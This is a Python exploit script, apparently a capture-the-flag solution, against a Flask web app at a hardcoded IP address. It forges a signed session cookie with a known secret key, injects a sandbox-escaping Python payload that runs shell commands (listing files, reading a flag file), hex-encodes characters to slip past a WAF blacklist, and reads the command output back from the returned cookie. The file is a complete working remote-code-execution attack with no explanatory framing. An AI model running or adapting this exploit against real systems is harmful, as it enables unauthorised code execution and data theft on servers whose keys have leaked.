import requests
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

TARGET = 'http://165.22.122.134:30898//'
SECRET_KEY = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'

# PAYLOAD = u"""i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
# i('flask').session['x']=i('os').popen('ls').read()"""

PAYLOAD = u"""i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
i('flask').session['x']=i('os').popen('cat t*').read()"""

class flask_encoding:
	def __init__(self):
		scsi = SecureCookieSessionInterface()
		signer_kwargs = dict(
			key_derivation=scsi.key_derivation,
			digest_method=scsi.digest_method
		)
		self.serializer = URLSafeTimedSerializer(SECRET_KEY, salt=scsi.salt,
										serializer=scsi.serializer,
										signer_kwargs=signer_kwargs
										)

	def deserialize(self, cookie_str):
		return self.serializer.loads(cookie_str)

	def serialize(self, cookie_dict):
		return self.serializer.dumps(cookie_dict)

# waf bypass encoding
def encode_payload(payload):
    payload = u'"a"\nexec """' + payload + u'"""'
    blacklist = {
    '[': '\\x5b',
    '(': '\\x28',
    '_': '\\x5f',
    '.': '\\x2e'
    }
    for c,h in blacklist.items():
        if c in payload:
            payload = payload.replace(c, h)
    return payload

def modify_cookie(s):
	f = flask_encoding()
	cookie_dict = f.deserialize(s.cookies['session'])
	cookie_dict['ingredient'] = u'i'
	cookie_dict['measurements'] = encode_payload(PAYLOAD)
	s.cookies['session'] = f.serialize(cookie_dict)
	return s, f

def exec_rce(s, f):
	r = s.get(TARGET)
	try:
		enc_exfil_data = r.cookies['session']
	except KeyError:
		print('Exploit failed, session cookie not found!')
		exit(1)
	return f.deserialize(enc_exfil_data)

def main():
	s = requests.session()
	s.get(TARGET)

	s, f = modify_cookie(s)
	exfil_data = exec_rce(s, f)
	print(exfil_data['x'])

if __name__ == '__main__':
	main()